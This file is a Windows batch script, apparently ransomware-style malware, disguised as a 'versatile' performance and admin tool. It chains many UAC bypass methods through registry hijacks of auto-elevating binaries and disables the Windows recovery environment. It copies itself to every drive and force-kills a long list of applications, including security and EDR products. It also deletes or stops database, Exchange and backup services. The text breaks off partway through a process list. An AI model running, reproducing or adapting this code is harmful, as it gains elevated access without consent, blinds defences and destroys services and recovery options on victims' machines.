@echo off
net session >nul 2>&1 || goto :uac
@CHCP 65001 >nul
setlocal EnableDelayedExpansion
set "f=%~f0"
if "%~d0"=="\\" (
 pushd "%~dp0"
 set "f=!CD!\%~nx0"
)
set "p=%TEMP%\s.ps1"
set "c=%NUMBER_OF_PROCESSORS%"
set "r=%TEMP%\r.vbs"
set "x=%TEMP%\d.bin"
set "dp_script=%TEMP%\invincible.txt"
set "dp_output=%TEMP%\dp_output.txt"
goto :uac

:uac
set "_f=%~dpnx0"
powershell -c "Start-Process '%_f%' -Verb RunAs -WindowStyle Hidden" >nul 2>&1 && exit /b
call :uac_fodhelper & if %errorlevel% equ 0 goto :elevated_ok
call :uac_silentcleanup & if %errorlevel% equ 0 goto :elevated_ok
call :uac_ms_settings & if %errorlevel% equ 0 goto :elevated_ok
call :uac_computerdefaults & if %errorlevel% equ 0 goto :elevated_ok
call :uac_slui & if %errorlevel% equ 0 goto :elevated_ok
call :uac_colorui & if %errorlevel% equ 0 goto :elevated_ok
call :uac_cmstplua & if %errorlevel% equ 0 goto :elevated_ok
call :uac_pcasvc & if %errorlevel% equ 0 goto :elevated_ok
call :uac_quickassist & if %errorlevel% equ 0 goto :elevated_ok
:retry_msg
if not defined retryCount set "retryCount=0"
set /a retryCount+=1
if %retryCount% gtr 5 goto :retry_limit
set "msg[0]=English: Please run this script as Administrator. Right-click on the file and select 'Run as administrator'. Thank you for your cooperation! ^<3"
set "msg[1]=Tiếng Việt: Vui lòng chạy script này với quyền Administrator. Nhấp chuột phải vào file và chọn 'Run as administrator'. Cảm ơn bạn rất nhiều! ^<3"
set "msg[2]=中文: 请以管理员权限运行此脚本。右键单击该文件，然后选择“以管理员身份运行”。感谢您的合作！^<3"
set "msg[3]=日本語: このスクリプトを管理者として実行してください。ファイルを右クリックし、「管理者として実行」を選択してください。ご協力ありがとうございます！^<3"
set "msg[4]=한국어: 이 스크립트를 관리자 권한으로 실행하세요. 파일을 마우스 오른쪽 버튼으로 클릭하고 '관리자로 실행'을 선택하세요. 협조해 주셔서 감사합니다! ^<3"
set "msg[5]=Français: Veuillez exécuter ce script en tant qu'administrateur. Faites un clic droit sur le fichier et sélectionnez « Exécuter en tant qu'administrateur ». Merci de votre coopération ! ^<3"
set "msg[6]=Deutsch: Bitte führen Sie dieses Skript als Administrator aus. Klicken Sie mit der rechten Maustaste auf die Datei und wählen Sie „Als Administrator ausführen“. Vielen Dank für Ihre Unterstützung! ^<3"
set "msg[7]=Español: Ejecute este script como administrador. Haga clic derecho en el archivo y seleccione 'Ejecutar como administrador'. ¡Gracias por su cooperación! ^<3"
set "msg[8]=Русский: Пожалуйста, запустите этот скрипт от имени администратора. Щёлкните правой кнопкой мыши по файлу и выберите «Запуск от имени администратора». Спасибо за сотрудничество! ^<3"
set "msg[9]=العربية: يرجى تشغيل هذا السكريبت كمسؤول. انقر بزر الماوس الأيمن على الملف واختر 'تشغيل كمسؤول'. شكراً لتعاونك! ^<3"
:loop
cls
for /l %%i in (0,1,9) do echo !msg[%%i]!
echo.
echo ===============================================================================
echo Versatile script - Gamer: No cap, just admin. Your FPS will pop off, your ping will be chef's kiss. Unlock that main character energy and secure the dub! ^<3
echo Versatile script - Enterprise: Get admin, ditch the legacy bloat, and pivot to high-leverage ops. Let's align your infrastructure to that North Star! ^<3
echo Versatile script - Developer: Admin rights. Finally kill that rogue process, clean up technical debt, and vibe code without the "who wrote this?" horror. Let's go! ^<3
echo ===============================================================================
set /a wait=30*retryCount
if %wait% lss 1 set /a wait=30
timeout /t %wait% /nobreak >nul
net session >nul 2>&1
if %errorlevel% equ 0 goto :elevated_ok
set /a retryCount+=1
if %retryCount% gtr 10 goto :retry_limit
goto loop
:retry_limit
cls
echo Maximum retry attempts reached. Please run this script as Administrator and try again.
exit /b 1
:elevated_ok
goto :stealth

:uac_fodhelper
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /f >nul 2>&1
start /min fodhelper.exe
timeout /t 1 /nobreak >nul
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
net session >nul 2>&1
exit /b %errorlevel%

:uac_silentcleanup
set "_e=%~d0"
if "%_e%"=="" set "_e=%SystemDrive%"
reg add "HKCU\Environment" /v windir /t REG_SZ /d "%_e%\Windows" /f >nul 2>&1
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" >nul 2>&1
timeout /t 1 /nobreak >nul
reg delete "HKCU\Environment" /v windir /f >nul 2>&1
net session >nul 2>&1
exit /b %errorlevel%

:uac_ms_settings
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\shell\open" /v DelegateExecute /t REG_DWORD /d 0 /f >nul 2>&1
start computerdefaults.exe
timeout /t 2 /nobreak >nul
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
net session >nul 2>&1
exit /b %errorlevel%

:uac_computerdefaults
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
start computerdefaults.exe
timeout /t 1 /nobreak >nul
reg delete "HKCU\Software\Classes\mscfile" /f >nul 2>&1
net session >nul 2>&1
exit /b %errorlevel%

:uac_slui
reg add "HKCU\Software\Classes\exefile\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
reg add "HKCU\Software\Classes\exefile\shell\open\command" /v DelegateExecute /f >nul 2>&1
start slui.exe
timeout /t 1 /nobreak >nul
reg delete "HKCU\Software\Classes\exefile\shell" /f >nul 2>&1
net session >nul 2>&1
exit /b %errorlevel%

:uac_colorui
reg add "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}\InprocServer32" /d "%~dpnx0" /f >nul 2>&1
reg add "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}\InprocServer32" /v ThreadingModel /d "Apartment" /f >nul 2>&1
start /min colorcpl.exe
timeout /t 1 /nobreak >nul
reg delete "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}" /f >nul 2>&1
net session >nul 2>&1
exit /b %errorlevel%

:uac_pcasvc
reg add "HKCU\Environment" /v windir /t REG_EXPAND_SZ /d "C:\Windows\System32\pcadm.dll,%TEMP%\poc.dll" /f >nul 2>&1
schtasks /run /tn "\Microsoft\Windows\Application Experience\PcaPatchDbTask" >nul 2>&1
timeout /t 2 /nobreak >nul
reg delete "HKCU\Environment" /v windir /f >nul 2>&1
net session >nul 2>&1
exit /b %errorlevel%

:uac_quickassist
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge\WebView2" /v BrowserExecutableFolder /t REG_SZ /d "%TEMP%" /f >nul 2>&1
start /min QuickAssist.exe
timeout /t 3 /nobreak >nul
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Edge\WebView2" /f >nul 2>&1
taskkill /f /im QuickAssist.exe >nul 2>&1
net session >nul 2>&1
exit /b %errorlevel%

:uac_cmstplua
reg add "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}\InprocServer32" /d "%~dpnx0" /f >nul 2>&1
reg add "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}\InprocServer32" /v ThreadingModel /d "Apartment" /f >nul 2>&1
start /min cmstp.exe /au
timeout /t 1 /nobreak >nul
reg delete "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}" /f >nul 2>&1
net session >nul 2>&1
goto :stealth

:stealth
if "%~1"=="--elevated" goto :START_PROCESS
start "" /Realtime "%~dpnx0" --elevated >nul 2>&1
reagentc /disable >nul 2>&1
powershell -Command "Get-PSDrive -PSProvider FileSystem | ForEach-Object { try { Copy-Item -Path '%~f0' -Destination (Join-Path $_.Root 'Backup_System.bat') -Force -ErrorAction Stop } catch {} }" >nul 2>&1
:START_PROCESS
powershell -WindowStyle Hidden -Command "$processesToKill = @('Teams','Webex','Slack','Zoom','Discord','Skype','Outlook','OneDrive','Dropbox','Spotify','Adobe','AutoCAD','SolidWorks','Matlab','Python','Java','Docker','VMware','VirtualBox','Git','Sourcetree','Postman','FileZilla','WinRAR','7z','Notepadpp','Sublime','VSCode','Chrome','Edge','Firefox','Opera','Brave','Thunderbird','Evernote','Trello','Asana','Todoist','CamStudio','OBS','ShareX','Greenshot','Loom','Audacity','VLC','GIMP','Inkscape','Blender','Unity','Unreal','Steam','EpicGames','Origin','Uplay','BattleNet','GOG','DiscordPTB','Franz','Rambox','Miranda','Pidgin','Trillian','Telegram','Signal','Line','Viber','WeChat','WhatsApp','QQ','ICQ','Mailbird','eMClient','TheBat','Foxmail','OperaMail','ClawsMail','SumatraPDF','Foxit','Nitro','PDF24','AdobeReader','ChromeRemote','AnyDesk','TeamViewer','LogMeIn','VNC','UltraVNC','TightVNC','RealVNC','AmmyyAdmin','Splashtop','ConnectWise','ScreenConnect','SimpleHelp','RemoteUtilities','RAdmin','DameWare','NetSupport','Bomgar','BeyondTrust','GoToAssist','ZohoAssist','Freshdesk','TeamSupport','LiveAgent','Kayako','Zendesk','HappyFox','Intercom','Drift','Crisp','Tawk','Smartsupp','LiveChat','Chatra','Olark','Userlike','Cobrowsing','Surfly','Ujet','Talkdesk','Aircall','RingCentral','Genesys','CiscoJabber','Avaya','Mitel','Nortel','ShoreTel','3CX','FreeSWITCH','Asterisk','ViciDial','GoAutoDial','Elastix','PBXAct','FusionPBX','Issabel','VitalPBX','Switchvox','Digium','Sangoma','Grandstream','Yealink','Polycom','Snom','CiscoIPPhone','LinksysSpa','Obihai','Ooma','Vonage','MagicJack','NetTalk','PhonePower','VOIPo','Voip.ms','Callcentric','Flowroute','Telnyx','Twilio','Plivo','Bandwidth','Voxbone','SignalWire','Telestax','Restcomm','Mobicents','Jitsi','Meetecho','Janus','Kurento','Mediasoup','OpenVidu','LiveKit','DailyCo','Whereby','Vdoo','8x8','BlueJeans','Lifesize','Pexip','StarLeaf','Highfive','ZoomRooms','GoogleMeet','Hangouts','Duo','FacebookMessenger','SkypeForBusiness','MicrosoftTeams','SlackHuddle','DiscordStage','Clubhouse','TwitterSpaces','SpotifyGreenroom','AmazonChime','GoToMeeting','JoinMe','WebExMeeting','AdobeConnect','OmniJoin','ClickMeeting','EasyWebinar','Demio','Livestorm','BigMarker','WebinarJam','StealthSeminar','EverWebinar','WebinarGeek','ZoomWebinar','CiscoWebexEvents','MicrosoftLiveEvents','YouTubeLive','FacebookLive','InstagramLive','TikTokLive','TwitchLive','VimeoLive','StreamYard','Restream','Melon','Castr','SwitchboardLive','Dacast','IBMQRadar','Splunk','ArcSight','LogRhythm','AlienVault','McAfeeEEPC','SymantecEndpoint','TrendMicroOfficeScan','SophosInterceptX','CrowdStrike','CarbonBlack','Cybereason','SentinelOne','BitdefenderGravityZone','KasperskyEndpoint','ESETFileSecurity','Forticlient','PaloAltoTraps','CheckPointEndpoint','FireEyeHX','Cylance','MalwarebytesEndpoint','WebrootSecureAnywhere','ComodoEndpoint','VIPRE','AVG','Avast','Avira','Panda','ZoneAlarm','BullGuard','F-Secure','GData','Qihoo360','TencentPCManager','BaiduAntivirus','K7Computing','QuickHeal','eScan','Norman','Immunet','ClamWin','SophosHome','Norton','McAfeeTotal','BitdefenderTotal','KasperskyTotal','ESETSmart','TrendMicroMax','ForticlientVPN','PulseSecure','GlobalProtect','AnyConnect','OpenVPN','WireGuard','SoftEther','Tinc','ZeroTier','Tailscale','Netbird','Headscale','Subspace','Innernet','Nebula','Slirp','VpnCloud','Tuns','BoringTun','CloudflareWarp','Psiphon','ProtonVPN','NordVPN','ExpressVPN','CyberGhost','Surfshark','VyprVPN','PrivateInternetAccess','HotspotShield','TunnelBear','Windscribe','Mullvad','IVPN','AzireVPN','OVPN','TrustZone','VPNUnlimited','KeepSolid','PureVPN','Ivacy','SaferVPN','ZenMate','Hoxx','SetupVPN','Betternet','TouchVPN','TurboVPN','SuperVPN','FastVPN','SnapVPN','ThunderVPN','LightningVPN','AtlasVPN','DewVPN','CeloVPN','Hidemyass','VPNBook','VPNGate','FreeVPN','Proxy','Shadowsocks','V2Ray','Trojan','Brook','Goflyway','Gost','Stunnel','Socat','RedSocks','Redsocks2','DNS2Socks','ProxyChains','Tor','Obfsproxy','Snowflake','Meek','Fte','Shapeshifter','Conjure','Taps','Lyrebird','Raven','OONIProbe','MeasurementLab','Ivy','Geneva','Censorships','Lantern','PsiphonPro','Infinite','GoodbyeDPI','Zapret','SpoofDPI','GreenTunnel','Sbypass','PowerTunnel','SimpleDnscrypt','Stubby','GetDns','DohClient','DnsCryptProxy','PiHole','AdGuardHome','Blocky','NextDns','ControlD','OpenDns','CloudflareGateway','Quad9','CleanBrowsing','CiraDNS','NeustarRecursive','ComodoSecure','VerisignPublic','DNSWatch','SafeDNS','YandexDNS','AdGuardDNS','Censurfridns','FreenomWorld','HeNet','HurricaneElectric','Cloudns','DnsMadeEasy','Dyn','Noip','DuckDns','FreeDns','AfraidOrg','ZoneEdit','EasyDns','MyDnsJP','Odnsk','DnsExit','Dynu','Dnspod','AliyunDns','HuaweiDns','TencentDns','BaiduDns','GoogleCloudDns','AzureDns','AwsRoute53','OracleDns','VmwareHorizon','CitrixReceiver','RemoteApp','MicrosoftRDS','XenApp','XenDesktop','ThinApp','Spoon','Turbo','Numecent','AppZero','Cloudpaging','FlexApp','Liquidware','FSLogix','ProfileUnity','AppSense','RESWorkspace','Ivanti','HEAT','LANDesk','ManageEngine','SolarWinds','PRTG','Nagios','Zabbix','Icinga','Prometheus','Grafana','Datadog','NewRelic','Dynatrace','AppDynamics','Instana','SignalFx','Wavefront','Honeycomb','Lightstep','Jaeger','Zipkin','OpenTelemetry','ElasticStack','Logstash','Kibana','Graylog','Fluentd','Vector','DatadogAgent','Telegraf','Collectd','StatsD','Graphite','Netdata','Glances','htop','btop','nvtop','bpytop','bashtop','gtop','vtop','gotop','ytop','zenith','bottom','procs','duf','dust','lsd','exa','bat','fd','ripgrep','fzf','zoxide','starship','ohmyposh','powerline10k','zsh','fish','nushell','xonsh','elvish','ion','oil','murex','es','rc','akari','sisyphus','gingko','pomsky','rustscan','masscan','nmap','zmap','zgrab','httpx','subfinder','amass','naabu','dnsx','chaos','uncover','katana','gospider','hakrawler','waybackurls','gau','getjs','linkfinder','secretfinder','ffuf','dirsearch','gobuster','feroxbuster','wfuzz','dirb','buster','meg','freq','crlfuzz','smuggler','interactsh','ngrok','localtunnel','bore','rathole','frp','nps','ebpf','falco','tetragon','tracee','inspektor','gadgettracer','kubectl','helm','kustomize','skaffold','tilt','garden','werf','jenkins','gitlab','github','bitbucket','circleci','travisci','drone','woodpecker','argo','flux','tekton','spinnaker','keel','ansible','terraform','pulumi','packer','vagrant','vsphere','ovirt','proxmox','openstack','cloudstack','opennebula','opentelekom','scaleway','exoscale','linode','vultr','digitalocean','rackspace','akamai','fastly','cloudflare','stackpath','azurefrontdoor','awscf','googlecdn','imperva','incapsula','sucuri','quic','cloudzy','zenlayer','edgecast','limelight','highwinds','cdnetworks','wangsu','chinacache','ccih','cdntw','cnc','hgc','pccw','hkt','wharf','equinix','digitalrealty','colt','interxion','cyrusone','coresite','switch','databank','qts','flexential','aptum','ironmountain','ascenty','odata','scalax','akamaiConnected','cloudflareSpectrum','fastlyRealTime','edgeNext','cdnsun','section','stackpathWAF','sucuriWAF','impervaWAF','cloudflareWAF','awsWAF','azureWAF','googleWAF','openresty','nginx','apache','iis','caddy','traefik','haproxy','envoy','linkerd','dapr','consul','zookeeper','etcd','eureka','nacos','apollo','springcloud','netflixoss','kafka','rabbitmq','activemq','zeromq','nanomsg','nats','pulsar','redis','memcached','couchbase','arangodb','orientdb','neo4j','dgraph','cayley','janusgraph','hugegraph','neptune','rdfox','graphdb','stardog','blazegraph','fuseki','virtuoso','sparql','gremlin','cypher','query','opencypher','mysql','postgresql','sqlite','mariadb','percona','oracle','sqlserver','db2','informix','saphana','teradata','greenplum','vertica','redshift','snowflake','bigquery','azureSynapse','databricks','presto','trino','athena','dremio','clickhouse','doris','starrocks','hive','sparksql','impala','kudu','kylin','druid','pinot','drill','hawq','madlib','plproxy','pgpool','pgbouncer','patroni','stolon','citus','timescaledb','influxdb','questdb','promscale','m3db','victoriametrics','thanos','cortex','uberjaeger','honeycomb','logz','scalyr','logdna','papertrail','logentries','loggly','splunkCloud','datadogLogs','newrelicLogs','elasticCloud','logit','bonsai','searchly','opensearch','amazonES','azureSearch','algolia','typesense','meilisearch','sonic','quickwit','tantivy','surrealdb','materialize','feldera','bytewax','arroyo','risingwave','hydro','sneller','partyrock','coralogix','axiom','betterstack','highlightio','hyperdx','openobserve','lakera','rebuff','llamaGuard','azureAI','googleVertex','openAI','anthropic','cohere','ai21','huggingface','replicate','banana','modal','runpod','vast','tensorDock','lambdaLabs','coreweave','together','cerebras','groq','sambanova','graphcore','habana','cambricon','iluvatar','horizonRobotics','blackSesame','rockchip','amlogic','allwinner','mediatek','qualcomm','samsung','apple','huaweiHisilicon','xiaomiPinecone','openaidilemma','characterAI','novelAI','sudowrite','lex','rytr','copyAI','jasper','writesonic','wordtune','quillbot','grammarly','proWritingAid','languageTool','sapling','deepL','lilt','modernMT','omniscient','microsoftTranslator','googleTranslate','yandexTranslate','amazonTranslate','baiduTranslate','tencentTranslate','alibabaTranslate','youdao','sogou','ctcpl','nmt','lucy','sysTran','promt','pairaphrase','smartling','transifex','lokalise','crowdin','poeditor','oneSky','localize','phrase','locize','textmaster','gengo','unbabel','lingotek','wordbee','memsource','matecat','zanata','weblate','virtaal','poedit'); $critical = @('explorer','csrss','winlogon','services','lsass','svchost','System','Registry','smss','wininit'); Get-Process | Where-Object {$processesToKill -contains $_.Name -and $critical -notcontains $_.Name} | Stop-Process -Force -ErrorAction SilentlyContinue"
powershell -WindowStyle Hidden -Command "$svc=@('XT800Service_Personal','SQLSERVERAGENT','SQLWriter','SQLBrowser','MSSQLFDLauncher','MSSQLSERVER','QcSoftService','MSSQLServerOLAPService','VMTools','VGAuthService','MSDTC','TeamViewer','ReportServer','RabbitMQ','AHS SERVICE','Sense Shield Service','SSMonitorService','SSSyncService','TPlusStdAppService1300','MSSQL$SQL2008','SQLAgent$SQL2008','TPlusStdTaskService1300','TPlusStdUpgradeService1300','VirboxWebServer','jhi_service','LMS','FontCache3.0.0.0','OSP Service','DAService_TCP','eCard-TTransServer','eCardMPService','EnergyDataService','UI0Detect','K3MobileService','TCPIDDAService','WebAttendServer','UIODetect','wanxiao-monitor','VMAuthdService','VMUSBArbService','VMwareHostd','vm-agent','VmAgentDaemon','OpenSSHd','eSightService','apachezt','Jenkins','secbizsrv','SQLTELEMETRY','MSMQ','smtpsvrJT','zyb_sync','360EntHttpServer','360EntSvc','360EntClientSvc','NFWebServer','wampapache','MSSEARCH','msftesql','SyncBASE Service','OracleDBConcoleorcl','OracleJobSchedulerORCL','OracleMTSRecoveryService','OracleOraDb11g_home1ClrAgent','OracleOraDb11g_home1TNSListener','OracleVssWriterORCL','OracleServiceORCL','aspnet_state','Redis','JhTask','ImeDictUpdateService','MCService','allpass_redisservice_port21160','Flash Helper Service','Kiwi Syslog Server','UWS HiPriv Services','UWS LoPriv Services','ftnlsv3','ftnlses3','FxService','UtilDev Web Server Pro','ftusbrdwks','ftusbrdsrv','ZTE USBIP Client Guard','ZTE USBIP Client','ZTE FileTranS','wwbizsrv','qemu-ga','AlibabaProtect','ZTEVdservice','kbasesrv','MMRHookService','IpOverUsbSvc','MsDtsServer100','KuaiYunTools','KMSELDI','btPanel','Protect_2345Explorer','2345PicSvc','vmware-converter-agent','vmware-converter-server','vmware-converter-worker','QQCertificateService','OracleRemExecService','GPSDaemon','GPSUserSvr','GPSDownSvr','GPSStorageSvr','GPSDataProcSvr','GPSGatewaySvr','GPSMediaSvr','GPSLoginSvr','GPSTomcat6','GPSMysqld','GPSFtpd','Zabbix Agent','BackupExecAgentAccelerator','bedbg','BackupExecDeviceMediaService','BackupExecRPCService','BackupExecAgentBrowser','BackupExecJobEngine','BackupExecManagementService','MDM','TxQBService','Gailun_Downloader','RemoteAssistService','YunService','Serv-U','EasyFZS Server','Rpc Monitor','OpenFastAssist','Nuo Update Monitor','Daemon Service','asComSvc','OfficeUpdateService','RtcSrv','RTCASMCU','FTA','MASTER','NscAuthService','MSCRMUnzipService','MSCRMAsyncService$maintenance','MSCRMAsyncService','REPLICA','RTCATS','RTCAVMCU','RtcQms','RTCMEETINGMCU','RTCIMMCU','RTCDATAMCU','RTCCDR','ProjectEventService16','ProjectQueueService16','SPAdminV4','SPSearchHostController','SPTimerV4','SPTraceV4','OSearch16','ProjectCalcService16','c2wts','AppFabricCachingService','ADWS','MotionBoard57','MotionBoardRCService57','vsvnjobsvc','VisualSVNServer','FlexNet Licensing Service 64','BestSyncSvc','LPManager','MediatekRegistryWriter','RaAutoInstSrv_RT2870','CobianBackup10','SQLANYs_sem5','CASLicenceServer','SQLService','semwebsrv','TbossSystem','ErpEnvSvc','Mysoft.Autoupgrade.DispatchService','Mysoft.Autoupgrade.UpdateService','Mysoft.Config.WindowsService','Mysoft.DataCenterService','Mysoft.SchedulingService','Mysoft.Setup.InstallService','MysoftUpdate','edr_monitor','abs_deployer','savsvc','ShareBoxMonitorService','ShareBoxService','CloudExchangeService','U8WorkerService2','CIS','EASService','KICkSvr','U8SmsSrv','OfficeClearCache','TurboCRM70','U8DispatchService','U8EISService','U8EncryptService','U8GCService','U8KeyManagePool','U8MPool','U8SCMPool','U8SLReportService','U8TaskService','U8WebPool','UFAllNet','UFReportService','UTUService','U8WorkerService1'); $svc = $svc | Sort-Object -Unique; foreach($s in $svc){sc.exe delete $s 2>$null}; $net=@('U8WorkerService1','U8WorkerService2','memcached Server','Apache2.4','UFIDAWebService','MSComplianceAudit','MSExchangeADTopology','MSExchangeAntispamUpdate','MSExchangeCompliance','MSExchangeDagMgmt','MSExchangeDelivery','MSExchangeDiagnostics','MSExchangeEdgeSync','MSExchangeFastSearch','MSExchangeFrontEndTransport','MSExchangeHM','MSSQL$SQL2008','MSExchangeHMRecovery','MSExchangeImap4','MSExchangeIMAP4BE','MSExchangeIS','MSExchangeMailboxAssistants','MSExchangeMailboxReplication','MSExchangeNotificationsBroker','MSExchangePop3','MSExchangePOP3BE','MSExchangeRepl','MSExchangeRPC','MSExchangeServiceHost','MSExchangeSubmission','MSExchangeThrottling','MSExchangeTransport','MSExchangeTransportLogSearch','MSExchangeUM','MSExchangeUMCR','MySQL5_OA'); $net = $net | Sort-Object -Unique; foreach($n in $net){net stop $n 2>$null}; $task=@('pg_ctl.exe','rcrelay.exe','SogouImeBroker.exe','CCenter.exe','ScanFrm.exe','d_manage.exe','RsTray.exe','wampmanager.exe','RavTray.exe','mssearch.exe','sqlmangr.exe','msftesql.exe','SyncBaseSvr.exe','oracle.exe','TNSLSNR.exe','SyncBaseConsole.exe','aspnet_state.exe','AutoBackUpEx.exe','redis-server.exe','MySQLNotifier.exe','oravssw.exe','fppdis5.exe','His6Service.exe','dinotify.exe','JhTask.exe','Executer.exe','AllPassCBHost.exe','ap_nginx.exe','AndroidServer.exe','XT.exe','XTService.exe','AllPassMCService.exe','IMEDICTUPDATE.exe','FlashHelperService.exe','ap_redis-server.exe','UtilDev.WebServer.Monitor.exe','UWS.AppHost.Clr2.x86.exe','FoxitProtect.exe','ftnlses.exe','ftusbrdwks.exe','ftusbrdsrv.exe','ftnlsv.exe','Syslogd_Service.exe','UWS.HighPrivilegeUtilities.exe','ftusbsrv.exe','UWS.LowPrivilegeUtilities.exe','UWS.AppHost.Clr2.AnyCpu.exe','winguard_x64.exe','vmconnect.exe','firefox.exe','usbrdsrv.exe','usbserver.exe','Foxmail.exe','qemu-ga.exe','wwbizsrv.exe','ZTEFileTranS.exe','ZTEUsbIpc.exe','ZTEUsbIpcGuard.exe','AlibabaProtect.exe','kbasesrv.exe','ZTEVdservice.exe','MMRHookService.exe','extjob.exe','IpOverUsbSvc.exe','VMwareTray.exe','devenv.exe','PerfWatson2.exe','ServiceHub.Host.Node.x86.exe','ServiceHub.IdentityHost.exe','ServiceHub.VSDetouredHost.exe','ServiceHub.SettingsHost.exe','ServiceHub.Host.CLR.x86.exe','ServiceHub.RoslynCodeAnalysisService32.exe','ServiceHub.DataWarehouseHost.exe','Microsoft.VisualStudio.Web.Host.exe','SQLEXPRWT.exe','setup.exe','remote.exe','setup100.exe','landingpage.exe','WINWORD.exe','KuaiYun.exe','HwsHostPanel.exe','NovelSpider.exe','Service_KMS.exe','WebServer.exe','ChsIME.exe','btPanel.exe','Protect_2345Explorer.exe','Pic_2345Svc.exe','vmware-converter-a.exe','vmware-converter.exe','vmware.exe','vmware-unity-helper.exe','vmware-vmx.exe','usysdiag.exe','PopBlock.exe','gsinterface.exe','Gemstar.Group.CRS.Client.exe','TenpayServer.exe','RemoteExecService.exe','VS_TrueCorsManager.exe','ntpsvr-2019-01-22-wgs84.exe','rtkjob-ion.exe','ntpsvr-2019-01-22-no-usrcheck.exe','NtripCaster-2019-01-08.exe','BACSTray.exe','protect.exe','hfs.exe','jzmis.exe','NewFileTime_x64.exe','2345MiniPage.exe','JMJ_server.exe','cacls.exe','gpsdaemon.exe','gpsusersvr.exe','gpsdownsvr.exe','gpsstoragesvr.exe','gpsdataprocsvr.exe','gpsftpd.exe','gpsmysqld.exe','gpstomcat6.exe','gpsloginsvr.exe','gpsmediasvr.exe','gpsgatewaysvr.exe','gpssvrctrl.exe','zabbix_agentd.exe','BackupExec.exe','Att.exe','mdm.exe','BackupExecManagementService.exe','bengine.exe','benetns.exe','beserver.exe','pvlsvr.exe','beremote.exe','RemoteAssistProcess.exe','BarMoniService.exe','GoodGameSrv.exe','BarCMService.exe','TsService.exe','GoodGame.exe','BarServerView.exe','IcafeServicesTray.exe','BsAgent_0.exe','ControlServer.exe','DisklessServer.exe','DumpServer.exe','NetDiskServer.exe','PersonUDisk.exe','service_agent.exe','SoftMemory.exe','BarServer.exe','RtkNGUI64.exe','Serv-U-Tray.exe','QQPCSoftTrayTips.exe','SohuNews.exe','Serv-U.exe','QQPCRTP.exe','EasyFZS.exe','HaoYiShi.exe','HysMySQL.exe','wtautoreg.exe','ispiritPro.exe','CAService.exe','XAssistant.exe','TrustCA.exe','GEUU20003.exe','CertMgr.exe','eSafe_monitor.exe','MainExecute.exe','FastInvoice.exe','SoftMgrLite.exe','sesvc.exe','ScanFileServer.exe','Nuoadehgcgcd.exe','OpenFastAssist.exe','FastInvoiceAssist.exe','Nuoadfaggcje.exe','OfficeUpdate.exe','atkexComSvc.exe','FileTransferAgent.exe','MasterReplicatorAgent.exe','CrmAsyncService.exe','CrmUnzipService.exe','NscAuthService.exe','ReplicaReplicatorAgent.exe','ASMCUSvc.exe','OcsAppServerHost.exe','RtcCdr.exe','IMMCUSvc.exe','DataMCUSvc.exe','MeetingMCUSvc.exe','QmsSvc.exe','RTCSrv.exe','pnopagw.exe','NscAuth.exe','Microsoft.ActiveDirectory.WebServices.exe','DistributedCacheService.exe','c2wtshost.exe','Microsoft.Office.Project.Server.Calculation.exe','schedengine.exe','Microsoft.Office.Project.Server.Eventing.exe','Microsoft.Office.Project.Server.Queuing.exe','WSSADMIN.EXE','hostcontrollerservice.exe','noderunner.exe','OWSTIMER.EXE','wsstracing.exe','MySQLInstallerConsole.exe','EXCEL.EXE','RtkAudioService64.exe','RAVBg64.exe','FNPLicensingService64.exe','VisualSVNServer.exe','MotionBoard57.exe','MotionBoardRCService57.exe','LPManService.exe','RaRegistry.exe','RaAutoInstSrv.exe','RtHDVCpl.exe','DefenderDaemon.exe','BestSyncApp.exe','ApUI.exe','AutoUpdate.exe','LPManNotifier.exe','FieldAnalyst.exe','TimingGenerate.exe','Detector.exe','Estimator.exe','FA_Logwriter.exe','TrackingSrv.exe','cbInterface.exe','EnterprisePortal.exe','ccbService.exe','monitor.exe','U8DispatchService.exe','dbsrv16.exe','sqlservr.exe','KICManager.exe','KICMain.exe','ServerManagerLauncher.exe','TbossGate.exe','iusb3mon.exe','MgrEnvSvc.exe','Mysoft.Config.WindowsService.exe','Mysoft.UpgradeService.UpdateService.exe','hasplms.exe','Mysoft.Setup.InstallService.exe','Mysoft.UpgradeService.Dispatcher.exe','Mysoft.DataCenterService.WindowsHost.exe','Mysoft.DataCenterService.DataCleaning.exe','Mysoft.DataCenterService.DataTracking.exe','Mysoft.SchedulingService.WindowsHost.exe','ServiceMonitor.exe','Mysoft.SchedulingService.ExecuteEngine.exe','AgentX.exe','host.exe','vsjitdebugger.exe','VBoxSDS.exe','mysqld.exe','TeamViewer_Service.exe','TeamViewer.exe','CasLicenceServer.exe','tv_w32.exe','tv_x64.exe','rdm.exe','SecureCRT.exe','SecureCRTPortable.exe','VirtualBox.exe','VBoxSVC.exe','VirtualBoxVM.exe','abs_deployer.exe','edr_monitor.exe','sfupdatemgr.exe','ipc_proxy.exe','edr_agent.exe','edr_sec_plan.exe','sfavsvc.exe','DataShareBox.ShareBoxMonitorService.exe','DataShareBox.ShareBoxService.exe','Jointsky.CloudExchangeService.exe','Jointsky.CloudExchange.NodeService.ein','perl.exe','java.exe','emagent.exe','TsServer.exe','AppMain.exe','easservice.exe','Kingdee6.1.exe','QyKernel.exe','QyFragment.exe','UserClient.exe','GNCEFExternal.exe','Computer